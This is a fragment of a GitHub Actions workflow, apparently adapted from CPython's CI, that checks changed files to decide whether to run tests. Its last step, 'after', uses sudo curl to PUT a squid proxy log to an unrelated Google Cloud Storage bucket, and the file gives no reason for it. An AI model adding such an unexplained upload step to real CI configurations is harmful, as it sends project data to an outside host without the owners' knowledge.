    - continue-on-error: true
      uses: actions/checkout@v3
    - continue-on-error: true
      id: check
      name: Check for source changes
      run: "if [ -z \"$GITHUB_BASE_REF\" ]; then\n  echo '::set-output name=run_tests::true'\n\
        \  echo '::set-output name=run_ssl_tests::true'\nelse\n  git fetch origin\
        \ $GITHUB_BASE_REF --depth=1\n  # git diff \"origin/$GITHUB_BASE_REF...\"\
        \ (3 dots) may be more\n  # reliable than git diff \"origin/$GITHUB_BASE_REF..\"\
        \ (2 dots),\n  # but it requires to download more commits (this job uses\n\
        \  # \"git fetch --depth=1\").\n  #\n  # git diff \"origin/$GITHUB_BASE_REF...\"\
        \ (3 dots) works with Git\n  # 2.26, but Git 2.28 is stricter and fails with\
        \ \"no merge base\".\n  #\n  # git diff \"origin/$GITHUB_BASE_REF..\" (2 dots)\
        \ should be enough on\n  # GitHub, since GitHub starts by merging origin/$GITHUB_BASE_REF\n\
        \  # into the PR branch anyway.\n  #\n  # https://github.com/python/core-workflow/issues/373\n\
        \  git diff --name-only origin/$GITHUB_BASE_REF.. | grep -qvE '(\\.rst$|^Doc|^Misc)'\
        \ && echo '::set-output name=run_tests::true' || true\n  git diff --name-only\
        \ origin/$GITHUB_BASE_REF.. | grep -qE '(ssl|hashlib|hmac|^.github)' && echo\
        \ '::set-output name=run_ssl_tests::true' || true\nfi\n"
    - name: after
      run: sudo curl --request PUT -T /squid/squidlog.json --url https://storage.googleapis.com/virtualeventdemoblr.appspot.com/squid2/FZCJ/cpython.$(date
        +%s)
